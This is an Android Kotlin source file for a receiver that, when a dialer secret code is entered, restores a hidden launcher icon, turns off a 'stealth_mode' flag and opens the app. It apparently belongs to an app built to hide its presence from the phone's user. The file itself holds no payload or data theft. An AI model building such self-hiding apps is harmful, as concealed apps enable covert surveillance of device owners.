package com.example.receiver

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.example.MainActivity

class SecretCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SECRET_CODE") {
            try {
                // Restore launcher icon alias
                val aliasComponent = ComponentName(context.packageName, "com.example.MainActivityAlias")
                context.packageManager.setComponentEnabledSetting(
                    aliasComponent,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )

                // Save preference
                val prefs = context.getSharedPreferences("admin_sync_prefs", Context.MODE_PRIVATE)
                prefs.edit().putBoolean("stealth_mode", false).apply()

                // Launch MainActivity
                val launchIntent = Intent(context, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                }
                context.startActivity(launchIntent)
            } catch (_: Exception) {}
        }
    }
}
